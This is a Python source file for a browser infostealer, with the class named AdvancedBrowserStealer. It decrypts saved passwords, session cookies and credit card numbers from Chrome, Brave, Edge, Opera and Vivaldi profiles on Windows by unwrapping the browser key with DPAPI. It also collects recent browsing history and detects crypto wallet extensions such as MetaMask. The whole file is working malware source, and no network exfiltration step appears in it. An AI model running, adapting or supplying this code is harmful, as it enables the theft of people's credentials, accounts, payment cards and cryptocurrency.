import os
import json
import base64
import sqlite3
import shutil
import asyncio
from Crypto.Cipher import AES
import win32crypt

class AdvancedBrowserStealer:
    def __init__(self):
        self.browsers = {
            "Chrome": os.path.expanduser("~/AppData/Local/Google/Chrome/User Data"),
            "Brave": os.path.expanduser("~/AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            "Edge": os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data"),
            "Opera": os.path.expanduser("~/AppData/Roaming/Opera Software/Opera Stable"),
            "Vivaldi": os.path.expanduser("~/AppData/Local/Vivaldi/User Data")
        }
        
        self.wallet_extensions = {
            "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
            "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
            "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
            "afbcbjpbpfadlkmhmclhkeeodmamcflc": "Math Wallet",
            "fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain Wallet"
        }

    async def get_encryption_key(self, browser_path):
        try:
            local_state_path = os.path.join(browser_path, "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except:
            return None

    async def decrypt_value(self, encrypted_value, key):
        if not encrypted_value:
            return ""
        try:
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)
                return decrypted[:-16].decode()
            else:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except:
            return "[DECRYPTION_FAILED]"

    async def extract_passwords(self, profile_path, key):
        passwords = []
        login_data_path = os.path.join(profile_path, "Login Data")
        if not os.path.exists(login_data_path):
            return passwords
            
        temp_db = None
        try:
            temp_db = login_data_path + ".temp"
            shutil.copy2(login_data_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = await self.decrypt_value(encrypted_password, key)
                if url and username and password and password != "[DECRYPTION_FAILED]":
                    passwords.append({"url": url, "username": username, "password": password})
            conn.close()
        except:
            pass
        finally:
            if temp_db and os.path.exists(temp_db):
                os.remove(temp_db)
        return passwords

    async def extract_cookies(self, profile_path, key):
        cookies = []
        cookie_path = os.path.join(profile_path, "Network", "Cookies")
        if not os.path.exists(cookie_path):
            return cookies
            
        temp_db = None
        try:
            temp_db = cookie_path + ".temp"
            shutil.copy2(cookie_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for row in cursor.fetchall():
                host, name, encrypted_value = row
                value = await self.decrypt_value(encrypted_value, key)
                if host and name and value != "[DECRYPTION_FAILED]":
                    cookies.append({"host": host, "name": name, "value": value})
            conn.close()
        except:
            pass
        finally:
            if temp_db and os.path.exists(temp_db):
                os.remove(temp_db)
        return cookies

    async def extract_credit_cards(self, profile_path, key):
        cards = []
        cards_path = os.path.join(profile_path, "Web Data")
        if not os.path.exists(cards_path):
            return cards
            
        temp_db = None
        try:
            temp_db = cards_path + ".temp"
            shutil.copy2(cards_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for row in cursor.fetchall():
                name, exp_month, exp_year, encrypted_card = row
                card_number = await self.decrypt_value(encrypted_card, key)
                if name and card_number and card_number != "[DECRYPTION_FAILED]":
                    cards.append({"name": name, "number": card_number, "exp_month": exp_month, "exp_year": exp_year})
            conn.close()
        except:
            pass
        finally:
            if temp_db and os.path.exists(temp_db):
                os.remove(temp_db)
        return cards

    async def extract_history(self, profile_path):
        history = []
        history_path = os.path.join(profile_path, "History")
        if not os.path.exists(history_path):
            return history
            
        temp_db = None
        try:
            temp_db = history_path + ".temp"
            shutil.copy2(history_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500")
            for row in cursor.fetchall():
                url, title, visit_count = row
                if url:
                    history.append({"url": url, "title": title, "visit_count": visit_count})
            conn.close()
        except:
            pass
        finally:
            if temp_db and os.path.exists(temp_db):
                os.remove(temp_db)
        return history

    async def extract_wallet_extensions(self, profile_path):
        wallets = {}
        extensions_path = os.path.join(profile_path, "Local Extension Settings")
        if not os.path.exists(extensions_path):
            return wallets
            
        for ext_id, name in self.wallet_extensions.items():
            ext_path = os.path.join(extensions_path, ext_id)
            if os.path.exists(ext_path):
                wallets[name] = {"path": ext_path, "status": "found"}
        return wallets

    async def extract_profile_data(self, profile_path, key):
        data = {}
        data["passwords"] = await self.extract_passwords(profile_path, key)
        data["cookies"] = await self.extract_cookies(profile_path, key)
        data["credit_cards"] = await self.extract_credit_cards(profile_path, key)
        data["history"] = await self.extract_history(profile_path)
        data["wallets"] = await self.extract_wallet_extensions(profile_path)
        return data

    async def extract_browser_data(self, browser_name, browser_path):
        results = {}
        key = await self.get_encryption_key(browser_path)
        if not key:
            return results
            
        for profile in os.listdir(browser_path):
            profile_path = os.path.join(browser_path, profile)
            if os.path.isdir(profile_path) and any(x in profile.lower() for x in ["default", "profile"]):
                profile_data = await self.extract_profile_data(profile_path, key)
                if any(profile_data.values()):
                    results[profile] = profile_data
        return results

    async def steal_all_browser_data(self):
        results = {}
        for browser_name, browser_path in self.browsers.items():
            if os.path.exists(browser_path):
                browser_data = await self.extract_browser_data(browser_name, browser_path)
                if browser_data:
                    results[browser_name] = browser_data
        return results

async def extract_all_browser_data():
    stealer = AdvancedBrowserStealer()
    return await stealer.steal_all_browser_data()